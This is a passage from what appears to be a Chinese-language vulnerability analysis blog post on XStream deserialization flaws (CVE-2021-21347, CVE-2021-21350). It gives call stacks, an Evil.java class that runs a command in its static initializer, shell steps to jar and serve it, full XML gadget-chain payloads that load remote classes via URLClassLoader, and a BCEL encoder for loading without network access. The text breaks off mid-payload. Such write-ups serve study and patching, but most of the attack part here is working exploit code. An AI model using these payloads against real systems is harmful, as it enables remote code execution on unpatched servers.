class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">verify:170, ServerTableEntry (com.sun.corba.se.impl.activation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">get:343, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:402, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:662, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:256, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:89, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:130, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:161, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:109, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:99, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:125, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:366, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:465, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:111, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:2970, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:19, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE-2021-21347"></a>CVE-2021-21347</h3><h4 id="影响范围-7"><a href="#影响范围-7" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><p>特别注意：JDK &gt;&#x3D;  8u231 可用，其余低版本都会遇到下面这个报错，即便修复了 <code>&lt;outer-class&gt;</code> 报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: com.sun.tools.javac.processing.AnnotationProcessingError: java.lang.NullPointerException</span><br></pre></td></tr></table></figure><h4 id="版本说明-7"><a href="#版本说明-7" class="headerlink" title="版本说明"></a>版本说明</h4><ul><li>1.3.x 会直接报错</li><li>1.4.15 以后添加了黑名单，和上面是同一个黑名单。</li></ul><h4 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：XStream 在 xml 对象转 java 对象会触发标签里类的readObject， 于是 source 设置为<code>java.util.PriorityQueue#readObject</code>没有变，sink 是 <code>JavacProcessingEnvironment$NameProcessIterator#hasNext</code>，可以触发 <code>URLClassLoader.loadClass.newInstance</code>动态类加载。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/79fb70a15781c2adf2dffdab3c5cb677.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">hasNext:408, JavacProcessingEnvironment$NameProcessIterator (com.sun.tools.javac.processing)</span><br><span class="line">hasMoreElements:148, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:109, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">compare:153, ObservableList$1 (javafx.collections)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:20, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><p>这个利用过程的坑比较多，这里写详细一些。</p><p>首先如果出现下面这个错误，说明你需要把 <code>jdk1.8.0_231/lib/tools.jar</code> 添加到依赖里，因为少了对应的类<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/a4effdeacc78be1958af688e2390218e.png"><br>其次是构造一个 <code>Evil.jar</code> ，首先是 <code>Evil.java</code></p><figure class="highlight java"><figcaption><span>title:"Evil.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用下面的命令打包，并起好服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac .\Evil.java</span><br><span class="line">jar cvf Evil.jar Evil.class</span><br><span class="line">python -m http.server 7777</span><br></pre></td></tr></table></figure><p>然后使用下面的 <code>poc.xml</code> 就没问题了</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>Evil<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">ucp</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.URLClassPath&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">urls</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">vector</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">capacityIncrement</span>&gt;</span>0<span class="tag">&lt;/<span class="name">capacityIncrement</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">elementCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">elementCount</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">elementData</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:7777/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;/<span class="name">elementData</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">urls</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">path</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:7777/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">loaders</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">lmap</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">ucp</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;concurrent-hash-map&#x27;</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>true<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">pdcache</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">pos</span>&gt;</span>-2147483648<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5d49835dc3814b97810074cff7898c95.png"></p><h3 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE-2021-21350"></a>CVE-2021-21350</h3><h4 id="影响范围-8"><a href="#影响范围-8" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><p>特别注意：JDK &gt;&#x3D;  8u231 可用，其余低版本都会遇到下面这个报错，即便修复了 <code>&lt;outer-class&gt;</code> 报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: com.sun.tools.javac.processing.AnnotationProcessingError: java.lang.NullPointerException</span><br></pre></td></tr></table></figure><h4 id="版本说明-8"><a href="#版本说明-8" class="headerlink" title="版本说明"></a>版本说明</h4><ul><li>1.3.x 会直接报错</li><li>1.4.15 以后添加了黑名单，和上面是同一个黑名单。</li></ul><h4 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质： source 是<code>java.util.PriorityQueue#readObject</code>，sink  还是<code>JavacProcessingEnvironment$NameProcessIterator#hasNext</code>，与上一条链的区别是不使用<code>URLClassLoader</code>类，改成使用 bcel 链的 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，从而可以实现不出网利用。</p><figure class="highlight java"><figcaption><span>title:"Class文件转BCEL字节码"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">file2bcelcode</span><span class="params">(String classFilePath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$$BCEL$$&quot;</span>+Utility.encode(bytecode, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span 